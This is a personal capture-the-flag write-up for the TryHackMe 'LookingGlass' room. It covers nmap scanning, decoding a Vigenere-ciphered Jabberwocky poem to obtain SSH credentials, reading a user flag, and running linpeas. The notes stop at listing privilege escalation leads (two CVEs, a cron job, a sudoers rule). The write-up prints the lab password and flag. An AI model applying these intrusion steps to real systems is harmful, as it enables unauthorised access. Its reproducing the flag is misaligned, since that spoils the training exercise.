# THM - [LookingGlass](https://www.tryhackme.com/room/lookingglass#)
## [John Hammond](https://youtu.be/Wqvy1qGOAVA)
# 13AUG2022

# Target IP
```
export IP=10.10.6.149
```

## Intial nmap scan
```
nmap -sC -sV -oN nmap/initial.nmap $IP
nmap -p- -oN nmap/all_ips.nmap $IP
```

## Script to keep checking ssh output (Lower or Higher)
./ssh_spam.sh

## We found the magic port (9595)
ssh -o HostKeyAlgorithms=+ssh-rsa -o StrictHostKeyChecking=no $IP -p 9595

Warning: Permanently added '[10.10.6.149]:9595' (RSA) to the list of known hosts.

You've found the real service.
Solve the challenge to get access to the box
Jabberwock

'Mdes mgplmmz, cvs alv lsmtsn aowil
Fqs ncix hrd rxtbmi bp bwl arul;
Elw bpmtc pgzt alv uvvordcet,
Egf bwl qffl vaewz ovxztiql.

'Fvphve ewl Jbfugzlvgb, ff woy!
Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
Bplhrf xag Rjinlu imro, pud tlnp
Bwl jintmofh Iaohxtachxta!'

Oi tzdr hjw oqzehp jpvvd tc oaoh:
Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
Hv rfwmgl wl fp moi Tfbaun xkgm,
Puh jmvsd lloimi bp bwvyxaa.

Eno pz io yyhqho xyhbkhe wl sushf,
Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
Pud cykdttk ej ba gaxt!

Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
Ewl vpvict qseux dine huidoxt-achgb!
Al peqi pt eitf, ick azmo mtd wlae
Lx ymca krebqpsxug cevm.

'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
Cpqx vw bf eifz, qy mthmjwa dwn!
V jitinofh kaz! Gtntdvl! Ttspaj!'
Wl ciskvttk me apw jzn.

'Awbw utqasmx, tuh tst zljxaa bdcij
Wph gjgl aoh zkuqsi zg ale hpie;
Bpe oqbzc nxyi tst iosszqdtz,
Eew ale xdte semja dbxxkhfe.
Jdbr tivtmi pw sxderpIoeKeudmgdstd

## Vigenere Cipher
## https://www.dcode.fr/vigenere-cipher

Jabberwock #This is the key
thealphabetcipher #This is the second key

#Decrypted output
'Twas brillig, and the slithy toves
Did gyre and gimble in the wabe;
All mimsy were the borogoves,
And the mome raths outgrabe.

'Beware the Jabberwock, my son!
The jaws that bite, the claws that catch!
Beware the Jubjub bird, and shun
The frumious Bandersnatch!'

He took his vorpal sword in hand:
Long time the manxome foe he sought--
So rested he by the Tumtum tree,
And stood awhile in thought.

And as in uffish thought he stood,
The Jabberwock, with eyes of flame,
Came whiffling through the tulgey wood,
And burbled as it came!

One, two! One, two! And through and through
The vorpal blade went snicker-snack!
He left it dead, and with its head
He went galumphing back.

'And hast thou slain the Jabberwock?
Come to my arms, my beamish boy!
O frabjous day! Callooh! Callay!'
He chortled in his joy.

'Twas brillig, and the slithy toves
Did gyre and gimble in the wabe;
All mimsy were the borogoves,
And the mome raths outgrabe.
*Your secret is bewareTheJabberwock*

## Enter the secret in our ssh command
ssh -o HostKeyAlgorithms=+ssh-rsa -o StrictHostKeyChecking=no $IP -p 9595
...
Enter Secret: bewareTheJabberwock
<!-- 
jabberwock:CarryingHeartilyHandleSelfish
-->
Connection to 10.10.6.149 closed.


## SSH into our host
ssh -o HostKeyAlgorithms=+ssh-rsa -o StrictHostKeyChecking=no jabberwock@$IP
jabberwock@10.10.6.149's password: CarryingHeartilyHandleSelfish

## Lets look around
jabberwock@looking-glass:~$ cat user.txt
}32a911966cab2d643f5d57d9e0173d56{mht
jabberwock@looking-glass:~$ cat user.txt | rev
thm{65d3710e9d75d5f346d2bac669119a23}

## scp linpeas
```
scp /opt/linpeas.sh jabberwock@$IP:
```

## Run linpeas
```
chmod +x linpeas.sh
./linpeas
```

## Interesting output from linpeas
```
Vulnerable to CVE-2021-4034
Vulnerable to CVE-2021-3560

@reboot tweedledum bash /home/jabberwock/twasBrillig.sh

jabberwock@looking-glass:~$ cat /etc/sudoers.d/alice
alice ssalg-gnikool = (root) NOPASSWD: /bin/bash

```
# World executable ':/
```
ll /home/
drwx--x--x  6 alice        alice        4096 Jul  3  2020 alice/```
```
# We have a public key
```
jabberwock@looking-glass:/home/alice$ cat .ssh/id_rsa.pub
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGY+dwBeKw2NtTbGLN+3hpg+qZ9ebXvfkU+UZ/iP0TFmGWaYM0hFyE9oVSoldBmLmvJAfpjFk/kgglcQ0r5rhahEPI+jIYr/retdOf8hZYpCRr21DbGt2fLF3Bu2Io/Uvhur/i9Tc5RwD5pgfGqHKrf1qul5x4dWK36NU+uIeIIDveTuAcKCmTBZzM1rkwwaj7UKDiJ/N9+/i6E+TEEsuXd/isF/zhGa4oQTLpthn79Y4SAeV+SzmeAWeJbvHZHe/KrvHIOvCJcSN9bjJh76QuIZnLKTWJrscaE0qkhG5890l1P6s0auNgUuOHN5ZgGYfHsmSGQRQUhXHplXXL6CKF alice@looking-glass


jabberwock@looking-glass:/home/alice$ ls -l .ssh/id_rsa
-rw------- 1 humptydumpty humptydumpty 1679 Jul  3  2020 .ssh/id_rsa
```


